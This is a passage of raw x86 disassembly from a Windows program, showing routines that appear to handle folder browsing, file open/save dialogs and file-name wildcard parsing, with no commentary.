  405098:	e8 85 fc ff ff       	call   0x404d22
  40509d:	5f                   	pop    %edi
  40509e:	5e                   	pop    %esi
  40509f:	5b                   	pop    %ebx
  4050a0:	c9                   	leave
  4050a1:	c2 08 00             	ret    $0x8
  4050a4:	55                   	push   %ebp
  4050a5:	8b ec                	mov    %esp,%ebp
  4050a7:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  4050ad:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4050b0:	50                   	push   %eax
  4050b1:	ff 15 88 a2 42 00    	call   *0x42a288
  4050b7:	85 c0                	test   %eax,%eax
  4050b9:	74 04                	je     0x4050bf
  4050bb:	32 c0                	xor    %al,%al
  4050bd:	eb 5d                	jmp    0x40511c
  4050bf:	8b 45 08             	mov    0x8(%ebp),%eax
  4050c2:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  4050c6:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  4050ca:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  4050ce:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4050d1:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4050d7:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4050da:	8b 45 0c             	mov    0xc(%ebp),%eax
  4050dd:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4050e0:	56                   	push   %esi
  4050e1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4050e4:	50                   	push   %eax
  4050e5:	c7 45 ec 41 00 00 00 	movl   $0x41,-0x14(%ebp)
  4050ec:	ff 15 74 a2 42 00    	call   *0x42a274
  4050f2:	8b f0                	mov    %eax,%esi
  4050f4:	85 f6                	test   %esi,%esi
  4050f6:	75 04                	jne    0x4050fc
  4050f8:	32 c0                	xor    %al,%al
  4050fa:	eb 1f                	jmp    0x40511b
  4050fc:	57                   	push   %edi
  4050fd:	ff 75 10             	push   0x10(%ebp)
  405100:	56                   	push   %esi
  405101:	ff 15 84 a2 42 00    	call   *0x42a284
  405107:	8b f8                	mov    %eax,%edi
  405109:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40510c:	8b 08                	mov    (%eax),%ecx
  40510e:	56                   	push   %esi
  40510f:	50                   	push   %eax
  405110:	ff 51 14             	call   *0x14(%ecx)
  405113:	33 c0                	xor    %eax,%eax
  405115:	85 ff                	test   %edi,%edi
  405117:	0f 95 c0             	setne  %al
  40511a:	5f                   	pop    %edi
  40511b:	5e                   	pop    %esi
  40511c:	c9                   	leave
  40511d:	c2 0c 00             	ret    $0xc
  405120:	55                   	push   %ebp
  405121:	8b ec                	mov    %esp,%ebp
  405123:	81 ec 58 04 00 00    	sub    $0x458,%esp
  405129:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40512d:	53                   	push   %ebx
  40512e:	56                   	push   %esi
  40512f:	57                   	push   %edi
  405130:	8d b5 a8 fb ff ff    	lea    -0x458(%ebp),%esi
  405136:	74 30                	je     0x405168
  405138:	ff 75 14             	push   0x14(%ebp)
  40513b:	8b c6                	mov    %esi,%eax
  40513d:	50                   	push   %eax
  40513e:	e8 34 52 01 00       	call   0x41a377
  405143:	8b c6                	mov    %esi,%eax
  405145:	50                   	push   %eax
  405146:	e8 e4 51 01 00       	call   0x41a32f
  40514b:	ff 75 14             	push   0x14(%ebp)
  40514e:	8d b4 45 aa fb ff ff 	lea    -0x456(%ebp,%eax,2),%esi
  405155:	56                   	push   %esi
  405156:	e8 1c 52 01 00       	call   0x41a377
  40515b:	56                   	push   %esi
  40515c:	e8 ce 51 01 00       	call   0x41a32f
  405161:	83 c4 18             	add    $0x18,%esp
  405164:	8d 74 46 02          	lea    0x2(%esi,%eax,2),%esi
  405168:	68 a2 00 00 00       	push   $0xa2
  40516d:	e8 40 6f 00 00       	call   0x40c0b2
  405172:	50                   	push   %eax
  405173:	56                   	push   %esi
  405174:	e8 fe 51 01 00       	call   0x41a377
  405179:	56                   	push   %esi
  40517a:	e8 b0 51 01 00       	call   0x41a32f
  40517f:	8d 74 46 02          	lea    0x2(%esi,%eax,2),%esi
  405183:	68 58 a5 42 00       	push   $0x42a558
  405188:	56                   	push   %esi
  405189:	e8 e9 51 01 00       	call   0x41a377
  40518e:	56                   	push   %esi
  40518f:	e8 9b 51 01 00       	call   0x41a32f
  405194:	33 c9                	xor    %ecx,%ecx
  405196:	6a 58                	push   $0x58
  405198:	66 89 4c 46 02       	mov    %cx,0x2(%esi,%eax,2)
  40519d:	5e                   	pop    %esi
  40519e:	56                   	push   %esi
  40519f:	51                   	push   %ecx
  4051a0:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4051a3:	50                   	push   %eax
  4051a4:	e8 f7 51 01 00       	call   0x41a3a0
  4051a9:	8b 45 08             	mov    0x8(%ebp),%eax
  4051ac:	8b 1d 38 a0 42 00    	mov    0x42a038,%ebx
  4051b2:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4051b5:	a1 a8 25 43 00       	mov    0x4325a8,%eax
  4051ba:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4051bd:	8d 85 a8 fb ff ff    	lea    -0x458(%ebp),%eax
  4051c3:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4051c6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4051c9:	83 c4 24             	add    $0x24,%esp
  4051cc:	80 7d 18 00          	cmpb   $0x0,0x18(%ebp)
  4051d0:	89 75 a8             	mov    %esi,-0x58(%ebp)
  4051d3:	8b 75 10             	mov    0x10(%ebp),%esi
  4051d6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4051d9:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4051dc:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4051df:	c7 45 c8 00 08 00 00 	movl   $0x800,-0x38(%ebp)
  4051e6:	c7 45 dc 0c 08 01 00 	movl   $0x1080c,-0x24(%ebp)
  4051ed:	50                   	push   %eax
  4051ee:	74 08                	je     0x4051f8
  4051f0:	ff 15 30 a0 42 00    	call   *0x42a030
  4051f6:	eb 02                	jmp    0x4051fa
  4051f8:	ff d3                	call   *%ebx
  4051fa:	8b f8                	mov    %eax,%edi
  4051fc:	85 ff                	test   %edi,%edi
  4051fe:	75 2a                	jne    0x40522a
  405200:	ff 15 34 a0 42 00    	call   *0x42a034
  405206:	3d 02 30 00 00       	cmp    $0x3002,%eax
  40520b:	75 1b                	jne    0x405228
  40520d:	33 c0                	xor    %eax,%eax
  40520f:	80 7d 18 00          	cmpb   $0x0,0x18(%ebp)
  405213:	66 89 06             	mov    %ax,(%esi)
  405216:	8d 45 a8             	lea    -0x58(%ebp),%eax
  405219:	50                   	push   %eax
  40521a:	74 08                	je     0x405224
  40521c:	ff 15 30 a0 42 00    	call   *0x42a030
  405222:	eb 02                	jmp    0x405226
  405224:	ff d3                	call   *%ebx
  405226:	8b f8                	mov    %eax,%edi
  405228:	85 ff                	test   %edi,%edi
  40522a:	5f                   	pop    %edi
  40522b:	5e                   	pop    %esi
  40522c:	0f 95 c0             	setne  %al
  40522f:	5b                   	pop    %ebx
  405230:	c9                   	leave
  405231:	c2 14 00             	ret    $0x14
  405234:	55                   	push   %ebp
  405235:	8b ec                	mov    %esp,%ebp
  405237:	b8 08 20 00 00       	mov    $0x2008,%eax
  40523c:	e8 2f 54 01 00       	call   0x41a670
  405241:	56                   	push   %esi
  405242:	57                   	push   %edi
  405243:	6a 00                	push   $0x0
  405245:	ff 75 10             	push   0x10(%ebp)
  405248:	e8 f8 4e 00 00       	call   0x40a145
  40524d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405250:	89 45 10             	mov    %eax,0x10(%ebp)
  405253:	e8 8e b6 00 00       	call   0x4108e6
  405258:	be 00 08 00 00       	mov    $0x800,%esi
  40525d:	e9 b9 00 00 00       	jmp    0x40531b
  405262:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  405268:	50                   	push   %eax
  405269:	e8 a4 4b 00 00       	call   0x409e12
  40526e:	8b f8                	mov    %eax,%edi
  405270:	0f b7 07             	movzwl (%edi),%eax
  405273:	50                   	push   %eax
  405274:	e8 d4 4b 00 00       	call   0x409e4d
  405279:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  40527d:	74 23                	je     0x4052a2
  40527f:	84 c0                	test   %al,%al
  405281:	74 07                	je     0x40528a
  405283:	33 c0                	xor    %eax,%eax
  405285:	66 89 07             	mov    %ax,(%edi)
  405288:	eb 2f                	jmp    0x4052b9
  40528a:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  405290:	50                   	push   %eax
  405291:	e8 72 4e 00 00       	call   0x40a108
  405296:	50                   	push   %eax
  405297:	e8 90 4b 00 00       	call   0x409e2c
  40529c:	84 c0                	test   %al,%al
  40529e:	75 7b                	jne    0x40531b
  4052a0:	eb 17                	jmp    0x4052b9
  4052a2:	84 c0                	test   %al,%al
  4052a4:	74 13                	je     0x4052b9
  4052a6:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  4052ac:	68 58 a5 42 00       	push   $0x42a558
  4052b1:	50                   	push   %eax
  4052b2:	e8 92 50 01 00       	call   0x41a349
  4052b7:	59                   	pop    %ecx
  4052b8:	59                   	pop    %ecx
  4052b9:	66 83 bd fc ef ff ff 	cmpw   $0x2a,-0x1004(%ebp)
  4052c0:	2a 
  4052c1:	8b 7d 10             	mov    0x10(%ebp),%edi
  4052c4:	75 39                	jne    0x4052ff
  4052c6:	0f b7 85 fe ef ff ff 	movzwl -0x1002(%ebp),%eax
  4052cd:	50                   	push   %eax
  4052ce:	e8 7a 4b 00 00       	call   0x409e4d
  4052d3:	84 c0                	test   %al,%al
  4052d5:	74 28                	je     0x4052ff
  4052d7:	6a 2e                	push   $0x2e
  4052d9:	58                   	pop    %eax
  4052da:	6a 5c                	push   $0x5c
  4052dc:	66 89 85 f8 df ff ff 	mov    %ax,-0x2008(%ebp)
  4052e3:	58                   	pop    %eax
  4052e4:	56                   	push   %esi
  4052e5:	66 89 85 fa df ff ff 	mov    %ax,-0x2006(%ebp)
  4052ec:	57                   	push   %edi
  4052ed:	8d 85 fc df ff ff    	lea    -0x2004(%ebp),%eax
  4052f3:	50                   	push   %eax
  4052f4:	e8 99 b4 00 00       	call   0x410792
  4052f9:	8d bd f8 df ff ff    	lea    -0x2008(%ebp),%edi
  4052ff:	ff 75 18             	push   0x18(%ebp)
  405302:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  405308:	57                   	push   %edi
  405309:	6a 00                	push   $0x0
  40530b:	50                   	push   %eax
  40530c:	e8 34 4e 00 00       	call   0x40a145
  405311:	50                   	push   %eax
  405312:	e8 68 48 00 00       	call   0x409b7f
  405317:	84 c0                	test   %al,%al
  405319:	75 1e                	jne    0x405339
  40531b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40531e:	56                   	push   %esi
  40531f:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  405325:	50                   	push   %eax
  405326:	e8 67 b6 00 00       	call   0x410992
  40532b:	84 c0                	test   %al,%al
  40532d:	0f 85 2f ff ff ff    	jne    0x405262
  405333:	5f                   	pop    %edi
  405334:	5e                   	pop    %esi
  405335:	c9                   	leave
  405336:	c2 14 00             	ret    $0x14
  405339:	b0 01                	mov    $0x1,%al
  40533b:	eb f6                	jmp    0x405333
  40533d:	81 c1 e8 93 00 00    	add    $0x93e8,%ecx
